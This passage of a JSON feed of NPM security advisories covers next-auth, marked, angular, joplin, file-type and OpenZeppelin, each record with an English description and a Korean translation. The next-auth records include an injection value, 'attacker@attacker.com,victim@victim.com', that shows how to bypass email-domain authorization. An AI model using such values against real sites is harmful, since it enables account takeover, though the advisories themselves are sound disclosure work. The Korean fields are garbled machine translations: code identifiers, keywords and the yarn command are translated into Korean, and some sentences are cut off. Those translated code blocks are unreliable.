recommended. v3 is unmaintained.)\n\n### Workarounds\nIf for some reason you cannot upgrade, you can normalize the incoming request like the following, using Advanced Initialization:\n```ts\n// pages/api/auth/[...nextauth].ts\n\nfunction normalize(identifier) {\n  // Get the first two elements only,\n  // separated by `@` from user input.\n  let [local, domain] = identifier.toLowerCase().trim().split(\"@\")\n  // The part before \"@\" can contain a \",\"\n  // but we remove it on the domain part\n  domain = domain.split(\",\")[0]\n  return `${local}@${domain}`\n}\n\nexport default async function handler(req, res) {\n  if (req.body.email) req.body.email = normalize(req.body.email)\n  return await NextAuth(req, res, {/* your options */ })\n}\n```\n\n### References\n- EmailProvider: https://next-auth.js.org/providers/email\n- Normalize the email address: https://next-auth.js.org/providers/email#normalizing-the-email-address\n- Email syntax: https://en.wikipedia.org/wiki/Email_address#Local-part\n- `signIn` callback: https://next-auth.js.org/configuration/callbacks#sign-in-callback\n- Advanced Initialization: https://next-auth.js.org/configuration/initialization#advanced-initialization\n- `nodemailer` address: https://nodemailer.com/message/addresses\n\n### For more information\n\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\n\nThe issue was reported 26th of July, a response was sent out in less than 1 hour and after identifying the issue a patch was published within 5 working days.\n\n### Acknowledgments\n\nWe would like to thank [Socket](https://socket.dev) for disclosing this vulnerability in a responsible manner and following up until it got published.",
    "identifiers": "GHSA : GHSA-xv97-c62v-4587\nCVE : CVE-2022-35924",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:01:22Z",
    "publishedAt": "2022-08-02T18:00:33Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-xv97-c62v-4587\nhttps://github.com/nextauthjs/next-auth/commit/afb1fcdae3cc30445038ef588e491d139b916003\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35924\nhttps://en.wikipedia.org/wiki/Email_address#Local-part\nhttps://next-auth.js.org/configuration/callbacks#sign-in-callback\nhttps://next-auth.js.org/configuration/initialization#advanced-initialization\nhttps://next-auth.js.org/providers/email\nhttps://next-auth.js.org/providers/email#normalizing-the-email-address\nhttps://nodemailer.com/message/addresses\nhttps://next-auth.js.org/providers/email#normalizing-the-e-mail-address\nhttps://github.com/advisories/GHSA-xv97-c62v-4587",
    "name": "next-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.29.10",
    "identifier": "3.29.10",
    "descriptionKR": "### 영향\n`4.10.3` 또는 `3.29.10` 이전 버전에서 `EmailProvider`를 사용하는 `next-auth` 사용자가 영향을 받습니다.\n\n공격자가 쉼표로 구분된 이메일 목록(예: `attacker@attacker.com,victim@victim.com`)을 로그인 엔드포인트로 보내는 요청을 위조할 수 있는 경우 NextAuth.js는 이메일을 공격자와 피해자의 이메일 주소. 그런 다음 공격자는 이메일이 `attacker@attacker.com,victim@victim.com`인 새로 생성된 사용자로 로그인할 수 있습니다. 이는 `signIn` 콜백의 `email.endsWith(\"@victim.com\")`과 같은 기본 인증이 개발자에게 위협을 알리지 못하고 공격자가 `@attacker.com ` 주소.\n\n### 패치\n다른 곳에서 액세스하기 전에 로그인 엔드포인트로 전송되는 이메일 값을 정규화하여 `v4.10.3` 및 `v3.29.10`에서 이 취약점을 패치했습니다. 또한 'EmailProvider' 구성에 'normalizeIdentifier' 콜백을 추가하여 시스템에서 유효한 이메일 주소로 간주하는 요구 사항을 추가로 조정할 수 있습니다. (예: 엄격한 RFC2821 준수)\n\n업그레이드하려면 다음 중 하나를 실행하십시오.\n```쉬\nnpm i next-auth@latest\n```\n```쉬\n원사 추가 next-auth@latest\n```\n```쉬\npnpm add next-auth@latest\n```\n\n(최신 v4 버전으로 업데이트되지만 v3을 유지하려면 `latest`를 `3`으로 변경할 수 있습니다. 권장하지 않습니다. v3는 유지 관리되지 않습니다.)\n\n### 해결 방법\n어떤 이유로 업그레이드할 수 없는 경우 고급 초기화를 사용하여 다음과 같이 들어오는 요청을 정규화할 수 있습니다.\n```ts\n// 페이지/api/auth/[...nextauth].ts\n\n함수 정규화(식별자) {\n  // 처음 두 요소만 가져옵니다.\n  // 사용자 입력에서 `@`로 구분됩니다.\n  let [로컬, 도메인] = identifier.toLowerCase().trim().split(\"@\")\n  // \"@\" 앞 부분은 \",\"를 포함할 수 있습니다.\n  // 그러나 도메인 부분에서 제거합니다.\n  도메인 = 도메인.분할(\",\")[0]\n  `${로컬}@${도메인}` 반환\n}\n\n기본 비동기 함수 내보내기(req, res) {\n  if (req.body.email) req.body.email = normalize(req.body.email)\n  return await NextAuth(req, res, {/* 옵션 */ })\n}\n```\n\n### 참조\n- 이메일 제공자: https://next-auth.js.org/providers/email\n- 이메일 주소 정규화: https://next-auth.js.org/providers/email#normalizing-the-email-address\n- 이메일 구문: https://en.wikipedia.org/wiki/Email_address#Local-part\n- `signIn` 콜백: https://next-auth.js.org/configuration/callbacks#sign-in-callback\n- 고급 초기화: https://next-auth.js.org/configuration/initialization#advanced-initialization\n- `nodemailer` 주소: https://nodemailer.com/message/addresses\n\n### 자세한 내용은\n\n우려 사항이 있는 경우 https://next-auth.js.org/security#reporting-a-vulnerability에 설명된 책임 있는 공개를 요청합니다.\n\n### 타임라인\n\n이 문제는 7월 26일에 보고되었고 1시간 이내에 응답이 발송되었으며 문제를 식별한 후 영업일 기준 5일 이내에 패치가 게시되었습니다.\n\n### 감사의 말\n\n책임 있는 방식으로 이 취약점을 공개하고 게시될 때까지 후속 조치를 취한 [Socket](https://socket.dev)에게 감사드립니다."
  },
  {
    "description": "### Impact\n`next-auth` users who are using the `EmailProvider` either in versions before `4.10.3` or `3.29.10` are affected.\n\nIf an attacker could forge a request that sent a comma-separated list of emails (eg.: `attacker@attacker.com,victim@victim.com`) to the sign-in endpoint, NextAuth.js would send emails to both the attacker and the victim's e-mail addresses. The attacker could then login as a newly created user with the email being `attacker@attacker.com,victim@victim.com`. This means that basic authorization like `email.endsWith(\"@victim.com\")` in the `signIn` callback would fail to communicate a threat to the developer and would let the attacker bypass authorization, even with an `@attacker.com` address.\n\n### Patches\nWe patched this vulnerability in `v4.10.3` and `v3.29.10` by normalizing the email value that is sent to the sign-in endpoint before accessing it anywhere else. We also added a `normalizeIdentifier` callback on the `EmailProvider` configuration, where you can further tweak your requirements for what your system considers a valid e-mail address. (E.g.: strict RFC2821 compliance)\n\nTo upgrade, run one of the following:\n```sh\nnpm i next-auth@latest\n```\n```sh\nyarn add next-auth@latest\n```\n```sh\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change `latest` to `3` if you want to stay on v3. This is not recommended. v3 is unmaintained.)\n\n### Workarounds\nIf for some reason you cannot upgrade, you can normalize the incoming request like the following, using Advanced Initialization:\n```ts\n// pages/api/auth/[...nextauth].ts\n\nfunction normalize(identifier) {\n  // Get the first two elements only,\n  // separated by `@` from user input.\n  let [local, domain] = identifier.toLowerCase().trim().split(\"@\")\n  // The part before \"@\" can contain a \",\"\n  // but we remove it on the domain part\n  domain = domain.split(\",\")[0]\n  return `${local}@${domain}`\n}\n\nexport default async function handler(req, res) {\n  if (req.body.email) req.body.email = normalize(req.body.email)\n  return await NextAuth(req, res, {/* your options */ })\n}\n```\n\n### References\n- EmailProvider: https://next-auth.js.org/providers/email\n- Normalize the email address: https://next-auth.js.org/providers/email#normalizing-the-email-address\n- Email syntax: https://en.wikipedia.org/wiki/Email_address#Local-part\n- `signIn` callback: https://next-auth.js.org/configuration/callbacks#sign-in-callback\n- Advanced Initialization: https://next-auth.js.org/configuration/initialization#advanced-initialization\n- `nodemailer` address: https://nodemailer.com/message/addresses\n\n### For more information\n\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\n\nThe issue was reported 26th of July, a response was sent out in less than 1 hour and after identifying the issue a patch was published within 5 working days.\n\n### Acknowledgments\n\nWe would like to thank [Socket](https://socket.dev) for disclosing this vulnerability in a responsible manner and following up until it got published.",
    "identifiers": "GHSA : GHSA-xv97-c62v-4587\nCVE : CVE-2022-35924",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:01:22Z",
    "publishedAt": "2022-08-02T18:00:33Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-xv97-c62v-4587\nhttps://github.com/nextauthjs/next-auth/commit/afb1fcdae3cc30445038ef588e491d139b916003\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35924\nhttps://en.wikipedia.org/wiki/Email_address#Local-part\nhttps://next-auth.js.org/configuration/callbacks#sign-in-callback\nhttps://next-auth.js.org/configuration/initialization#advanced-initialization\nhttps://next-auth.js.org/providers/email\nhttps://next-auth.js.org/providers/email#normalizing-the-email-address\nhttps://nodemailer.com/message/addresses\nhttps://next-auth.js.org/providers/email#normalizing-the-e-mail-address\nhttps://github.com/advisories/GHSA-xv97-c62v-4587",
    "name": "next-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.10.3",
    "identifier": "4.10.3",
    "descriptionKR": "### 영향\n`4.10.3` 또는 `3.29.10` 이전 버전에서 `EmailProvider`를 사용하는 `next-auth` 사용자가 영향을 받습니다.\n\n공격자가 쉼표로 구분된 이메일 목록(예: `attacker@attacker.com,victim@victim.com`)을 로그인 엔드포인트로 보내는 요청을 위조할 수 있는 경우 NextAuth.js는 이메일을 공격자와 피해자의 이메일 주소. 그런 다음 공격자는 이메일이 `attacker@attacker.com,victim@victim.com`인 새로 생성된 사용자로 로그인할 수 있습니다. 이는 `signIn` 콜백의 `email.endsWith(\"@victim.com\")`과 같은 기본 인증이 개발자에게 위협을 알리지 못하고 공격자가 `@attacker.com ` 주소.\n\n### 패치\n다른 곳에서 액세스하기 전에 로그인 엔드포인트로 전송되는 이메일 값을 정규화하여 `v4.10.3` 및 `v3.29.10`에서 이 취약점을 패치했습니다. 또한 'EmailProvider' 구성에 'normalizeIdentifier' 콜백을 추가하여 시스템에서 유효한 이메일 주소로 간주하는 요구 사항을 추가로 조정할 수 있습니다. (예: 엄격한 RFC2821 준수)\n\n업그레이드하려면 다음 중 하나를 실행하십시오.\n```쉬\nnpm i next-auth@latest\n```\n```쉬\n원사 추가 next-auth@latest\n```\n```쉬\npnpm add next-auth@latest\n```\n\n(최신 v4 버전으로 업데이트되지만 v3을 유지하려면 `latest`를 `3`으로 변경할 수 있습니다. 권장하지 않습니다. v3는 유지 관리되지 않습니다.)\n\n### 해결 방법\n어떤 이유로 업그레이드할 수 없는 경우 고급 초기화를 사용하여 다음과 같이 들어오는 요청을 정규화할 수 있습니다.\n```ts\n// 페이지/api/auth/[...nextauth].ts\n\n함수 정규화(식별자) {\n  // 처음 두 요소만 가져옵니다.\n  // 사용자 입력에서 `@`로 구분됩니다.\n  let [로컬, 도메인] = identifier.toLowerCase().trim().split(\"@\")\n  // \"@\" 앞 부분은 \",\"를 포함할 수 있습니다.\n  // 그러나 도메인 부분에서 제거합니다.\n  도메인 = 도메인.분할(\",\")[0]\n  `${로컬}@${도메인}` 반환\n}\n\n기본 비동기 함수 내보내기(req, res) {\n  if (req.body.email) req.body.email = normalize(req.body.email)\n  return await NextAuth(req, res, {/* 옵션 */ })\n}\n```\n\n### 참조\n- 이메일 제공자: https://next-auth.js.org/providers/email\n- 이메일 주소 정규화: https://next-auth.js.org/providers/email#normalizing-the-email-address\n- 이메일 구문: https://en.wikipedia.org/wiki/Email_address#Local-part\n- `signIn` 콜백: https://next-auth.js.org/configuration/callbacks#sign-in-callback\n- 고급 초기화: https://next-auth.js.org/configuration/initialization#advanced-initialization\n- `nodemailer` 주소: https://nodemailer.com/message/addresses\n\n### 자세한 내용은\n\n우려 사항이 있는 경우 https://next-auth.js.org/security#reporting-a-vulnerability에 설명된 책임 있는 공개를 요청합니다.\n\n### 타임라인\n\n이 문제는 7월 26일에 보고되었고 1시간 이내에 응답이 발송되었으며 문제를 식별한 후 영업일 기준 5일 이내에 패치가 게시되었습니다.\n\n### 감사의 말\n\n책임 있는 방식으로 이 취약점을 공개하고 게시될 때까지 후속 조치를 취한 [Socket](https://socket.dev)에게 감사드립니다."
  },
  {
    "description": "Versions of `marked` from 0.3.14 until 0.6.2 are vulnerable to Regular Expression Denial of Service. Email addresses may be evaluated in quadratic time, allowing attackers to potentially crash the node process due to resource exhaustion.\n\n\n## Recommendation\n\nUpgrade to version 0.6.2 or later.",
    "identifiers": "GHSA : GHSA-xf5p-87ch-gxw2",
    "severity": "MODERATE",
    "updatedAt": "2023-01-11T05:08:03Z",
    "publishedAt": "2019-06-05T14:10:03Z",
    "references": "https://github.com/markedjs/marked/commit/b15e42b67cec9ded8505e9d68bb8741ad7a9590d\nhttps://github.com/markedjs/marked/pull/1460\nhttps://snyk.io/vuln/SNYK-JS-MARKED-174116\nhttps://www.npmjs.com/advisories/812\nhttps://github.com/markedjs/marked/releases/tag/v0.6.2\nhttps://github.com/advisories/GHSA-xf5p-87ch-gxw2",
    "name": "marked",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.3.14, < 0.6.2",
    "identifier": "0.6.2",
    "descriptionKR": "0.3.14에서 0.6.2까지의 `marked` 버전은 정규식 서비스 거부에 취약합니다. 이메일 주소는 2차 시간으로 평가될 수 있으므로 공격자가 리소스 고갈로 인해 잠재적으로 노드 프로세스를 충돌시킬 수 있습니다.\n\n\n## 추천\n\n버전 0.6.2 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of `angular` prior to 1.5.0-beta.1 are vulnerable to Cross-Site Scripting. The package fails to sanitize `xlink:href` attributes, which may allow attackers to execute arbitrary JavaScript in a victim's browser if the value is user-controlled.\n\n\n## Recommendation\n\nUpgrade to version 1.5.0-beta.1 or later.",
    "identifiers": "GHSA : GHSA-r5fx-8r73-v86c\nCVE : CVE-2019-14863",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:02:42Z",
    "publishedAt": "2020-02-14T23:08:49Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-14863\nhttps://github.com/angular/angular.js/pull/12524\nhttps://github.com/angular/angular.js/commit/35a21532b73d5bd84b4325211c563e6a3e2dde82\nhttps://github.com/angular/angular.js/commit/f33ce173c90736e349cf594df717ae3ee41e0f7a\nhttps://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-14863\nhttps://snyk.io/vuln/npm:angular:20150807\nhttps://www.npmjs.com/advisories/1453\nhttps://github.com/advisories/GHSA-r5fx-8r73-v86c",
    "name": "angular",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.5.0-beta.1",
    "identifier": "1.5.0-beta.1",
    "descriptionKR": "1.5.0-beta.1 이전의 `angular` 버전은 교차 사이트 스크립팅에 취약합니다. 이 패키지는 `xlink:href` 속성을 삭제하지 못하여 값이 사용자가 제어하는 ​​경우 공격자가 피해자의 브라우저에서 임의의 JavaScript를 실행할 수 있습니다.\n\n\n## 추천\n\n버전 1.5.0-beta.1 이상으로 업그레이드하십시오."
  },
  {
    "description": "Joplin v2.8.8 allows attackers to execute arbitrary commands via a crafted payload injected into the Node titles.",
    "identifiers": "GHSA : GHSA-ww2v-frv5-pj5x\nCVE : CVE-2022-35131",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:01:00Z",
    "publishedAt": "2022-07-26T00:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-35131\nhttps://github.com/laurent22/joplin/releases/tag/v2.9.1\nhttps://github.com/ly1g3/Joplin-CVE-2022-35131\nhttps://github.com/laurent22/joplin/commit/e797ebb864fbf429a49b6d20e5779d0c9aa6c4d5\nhttp://joplin.com\nhttps://github.com/advisories/GHSA-ww2v-frv5-pj5x",
    "name": "joplin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.9.1",
    "identifier": "2.9.1",
    "descriptionKR": "Joplin v2.8.8은 공격자가 노드 타이틀에 삽입된 조작된 페이로드를 통해 임의의 명령을 실행할 수 있도록 합니다."
  },
  {
    "description": "All versions of package @ianwalter/merge are vulnerable to Prototype Pollution via the main (`merge`) function. @ianwalter/merge is [deprecated](https://github.com/ianwalter/merge/blob/master/README.md) and the maintainer suggests using [@generates/merger](https://github.com/generates/generates/tree/main/packages/merger) instead.",
    "identifiers": "GHSA : GHSA-42m6-g935-5vmq\nCVE : CVE-2021-23397",
    "severity": "MODERATE",
    "updatedAt": "2023-01-31T05:01:31Z",
    "publishedAt": "2022-07-26T00:01:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23397\nhttps://security.snyk.io/vuln/SNYK-JS-IANWALTERMERGE-1311022\nhttps://github.com/advisories/GHSA-42m6-g935-5vmq",
    "name": "@ianwalter/merge",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 9.0.1",
    "descriptionKR": "@ianwalter/merge 패키지의 모든 버전은 메인(`merge`) 기능을 통한 Prototype Pollution에 취약합니다. @ianwalter/merge는 [더 이상 사용되지 않음](https://github.com/ianwalter/merge/blob/master/README.md) 관리자는 [@generates/merger](https://github.com/generates 사용을 제안합니다. /generates/tree/main/packages/merger) 대신."
  },
  {
    "description": "An issue was discovered in the file-type package from 13.0.0 until 16.5.4 and 17.x before 17.1.3 for Node.js. A malformed MKV file could cause the file type detector to get caught in an infinite loop. This would make the application become unresponsive and could be used to cause a DoS attack when used on a web server.",
    "identifiers": "GHSA : GHSA-mhxj-85r3-2x55\nCVE : CVE-2022-36313",
    "severity": "HIGH",
    "updatedAt": "2023-01-28T05:02:52Z",
    "publishedAt": "2022-07-22T00:00:38Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-36313\nhttps://github.com/sindresorhus/file-type/releases/tag/v16.5.4\nhttps://github.com/sindresorhus/file-type/releases/tag/v17.1.3\nhttps://www.npmjs.com/package/file-type\nhttps://github.com/sindresorhus/file-type/commit/2c4d1200c99dffb7d515b9b9951ef43c22bf7e47\nhttps://github.com/sindresorhus/file-type/commit/d86835680f4cccbee1a60628783c36700ec9e254\nhttps://github.com/sindresorhus/file-type/commit/8f981c32e2750d2516457e305e502ee2ad715759#diff-c853b2249e99790d8725774cf63c90c5ab17112067df6e267f3701d7bf591d12\nhttps://github.com/sindresorhus/file-type/compare/v12.4.2...v13.0.0#diff-c853b2249e99790d8725774cf63c90c5ab17112067df6e267f3701d7bf591d12R611-R613\nhttps://security.snyk.io/vuln/SNYK-JS-FILETYPE-2958042\nhttps://security.netapp.com/advisory/ntap-20220909-0005/\nhttps://github.com/advisories/GHSA-mhxj-85r3-2x55",
    "name": "file-type",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 13.0.0, < 16.5.4",
    "identifier": "16.5.4",
    "descriptionKR": "Node.js의 경우 13.0.0에서 16.5.4까지 및 17.1.3 이전의 17.x에서 파일 유형 패키지에서 문제가 발견되었습니다. 형식이 잘못된 MKV 파일로 인해 파일 유형 감지기가 무한 루프에 빠질 수 있습니다. 이로 인해 애플리케이션이 응답하지 않게 되고 웹 서버에서 사용될 때 DoS 공격을 유발하는 데 사용될 수 있습니다."
  },
  {
    "description": "An issue was discovered in the file-type package from 13.0.0 until 16.5.4 and 17.x before 17.1.3 for Node.js. A malformed MKV file could cause the file type detector to get caught in an infinite loop. This would make the application become unresponsive and could be used to cause a DoS attack when used on a web server.",
    "identifiers": "GHSA : GHSA-mhxj-85r3-2x55\nCVE : CVE-2022-36313",
    "severity": "HIGH",
    "updatedAt": "2023-01-28T05:02:52Z",
    "publishedAt": "2022-07-22T00:00:38Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-36313\nhttps://github.com/sindresorhus/file-type/releases/tag/v16.5.4\nhttps://github.com/sindresorhus/file-type/releases/tag/v17.1.3\nhttps://www.npmjs.com/package/file-type\nhttps://github.com/sindresorhus/file-type/commit/2c4d1200c99dffb7d515b9b9951ef43c22bf7e47\nhttps://github.com/sindresorhus/file-type/commit/d86835680f4cccbee1a60628783c36700ec9e254\nhttps://github.com/sindresorhus/file-type/commit/8f981c32e2750d2516457e305e502ee2ad715759#diff-c853b2249e99790d8725774cf63c90c5ab17112067df6e267f3701d7bf591d12\nhttps://github.com/sindresorhus/file-type/compare/v12.4.2...v13.0.0#diff-c853b2249e99790d8725774cf63c90c5ab17112067df6e267f3701d7bf591d12R611-R613\nhttps://security.snyk.io/vuln/SNYK-JS-FILETYPE-2958042\nhttps://security.netapp.com/advisory/ntap-20220909-0005/\nhttps://github.com/advisories/GHSA-mhxj-85r3-2x55",
    "name": "file-type",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 17.0.0, < 17.1.3",
    "identifier": "17.1.3",
    "descriptionKR": "Node.js의 경우 13.0.0에서 16.5.4까지 및 17.1.3 이전의 17.x에서 파일 유형 패키지에서 문제가 발견되었습니다. 형식이 잘못된 MKV 파일로 인해 파일 유형 감지기가 무한 루프에 빠질 수 있습니다. 이로 인해 애플리케이션이 응답하지 않게 되고 웹 서버에서 사용될 때 DoS 공격을 유발하는 데 사용될 수 있습니다."
  },
  {
    "description": "### Impact\n\n`SignatureChecker.isValidSignatureNow` is not expected to revert. However, an incorrect assumption about Solidity 0.8's `abi.decode` allows some cases to revert, given a target contract that doesn't implement EIP-1271 as expected.\n\nThe contracts that may be affected are those that use `SignatureChecker` to check the validity of a signature and handle invalid signatures in a way other than reverting. We believe this to be unlikely.\n\n### Patches\n\nThe issue was patched in 4.7.1.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying the fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).",
    "identifiers": "GHSA : GHSA-4g63-c64m-25w9\nCVE : CVE-2022-31172",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:07:10Z",
    "publishedAt": "2022-07-21T22:33:37Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-4g63-c64m-25w9\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31172\nhttps://github.com/advisories/GHSA-4g63-c64m-25w9",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.1.0, < 4.7.1",
    "identifier": "4.7.1",
    "descriptionKR": "### 영향\n\n'SignatureChecker.isValidSignatureNow'는 되돌릴 것으로 예상되지 않습니다. 그러나 Solidity 0.8의 'abi.decode'에 대한 잘못된 가정으로 인해 예상대로 EIP-1271을 구현하지 않는 대상 계약이 주어지면 일부 경우를 되돌릴 수 있습니다.\n\n영향을 받을 수 있는 계약은 'SignatureChecker'를 사용하여 서명의 유효성을 확인하고 되돌리기 이외의 방식으로 유효하지 않은 서명을 처리하는 계약입니다. 그럴 가능성은 희박합니다.\n\n### 패치\n\n이 문제는 4.7.1에서 패치되었습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\n`SignatureChecker.isValidSignatureNow` is not expected to revert. However, an incorrect assumption about Solidity 0.8's `abi.decode` allows some cases to revert, given a target contract that doesn't implement EIP-1271 as expected.\n\nThe contracts that may be affected are those that use `SignatureChecker` to check the validity of a signature and handle invalid signatures in a way other than reverting. We believe this to be unlikely.\n\n### Patches\n\nThe issue was patched in 4.7.1.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying the fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).",
    "identifiers": "GHSA : GHSA-4g63-c64m-25w9\nCVE : CVE-2022-31172",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:07:10Z",
    "publishedAt": "2022-07-21T22:33:37Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-4g63-c64m-25w9\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31172\nhttps://github.com/advisories/GHSA-4g63-c64m-25w9",
    "name": "@openzeppelin/contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.1.0, < 4.7.1",
    "identifier": "4.7.1",
    "descriptionKR": "### 영향\n\n'SignatureChecker.isValidSignatureNow'는 되돌릴 것으로 예상되지 않습니다. 그러나 Solidity 0.8의 'abi.decode'에 대한 잘못된 가정으로 인해 예상대로 EIP-1271을 구현하지 않는 대상 계약이 주어지면 일부 경우를 되돌릴 수 있습니다.\n\n영향을 받을 수 있는 계약은 'SignatureChecker'를 사용하여 서명의 유효성을 확인하고 되돌리기 이외의 방식으로 유효하지 않은 서명을 처리하는 계약입니다. 그럴 가능성은 희박합니다.\n\n### 패치\n\n이 문제는 4.7.1에서 패치되었습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\n`ERC165Checker.supportsInterface` is designed to always successfully return a boolean, and under no circumstance revert. However, an incorrect assumption about Solidity 0.8's `abi.decode` allows some cases to revert, given a target contract that doesn't implement EIP-165 as expected, specifically if it returns a value other than 0 or 1.\n\nThe contracts that may be affected are those that use `ERC165Checker` to check for support for an interface and then handle the lack of support in a way other than reverting.\n\n### Patches\n\nThe issue was patched in 4.7.1.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying the fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).\n",
    "identifiers": "GHSA : GHSA-qh9x-gcfh-pcrw\nCVE : CVE-2022-31170",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:01:00Z",
    "publishedAt": "2022-07-21T22:33:01Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-qh9x-gcfh-pcrw\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31170\nhttps://github.com/advisories/GHSA-qh9x-gcfh-pcrw",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.7.1",
    "identifier": "4.7.1",
    "descriptionKR": "### 영향\n\n'ERC165Checker.supportsInterface'는 항상 성공적으로 부울을 반환하고 어떤 상황에서도 되돌리지 않도록 설계되었습니다. 그러나 Solidity 0.8의 'abi.decode'에 대한 잘못된 가정으로 인해 예상대로 EIP-165를 구현하지 않는 대상 계약, 특히 0 또는 1 이외의 값을 반환하는 경우 일부 사례를 되돌릴 수 있습니다.\n\n영향을 받을 수 있는 계약은 'ERC165Checker'를 사용하여 인터페이스에 대한 지원을 확인한 다음 되돌리기 이외의 방법으로 지원 부족을 처리하는 계약입니다.\n\n### 패치\n\n이 문제는 4.7.1에서 패치되었습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\n`ERC165Checker.supportsInterface` is designed to always successfully return a boolean, and under no circumstance revert. However, an incorrect assumption about Solidity 0.8's `abi.decode` allows some cases to revert, given a target contract that doesn't implement EIP-165 as expected, specifically if it returns a value other than 0 or 1.\n\nThe contracts that may be affected are those that use `ERC165Checker` to check for support for an interface and then handle the lack of support in a way other than reverting.\n\n### Patches\n\nThe issue was patched in 4.7.1.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying the fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).\n",
    "identifiers": "GHSA : GHSA-qh9x-gcfh-pcrw\nCVE : CVE-2022-31170",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:01:00Z",
    "publishedAt": "2022-07-21T22:33:01Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-qh9x-gcfh-pcrw\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31170\nhttps://github.com/advisories/GHSA-qh9x-gcfh-pcrw",
    "name": "@openzeppelin/contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.7.1",
    "identifier": "4.7.1",
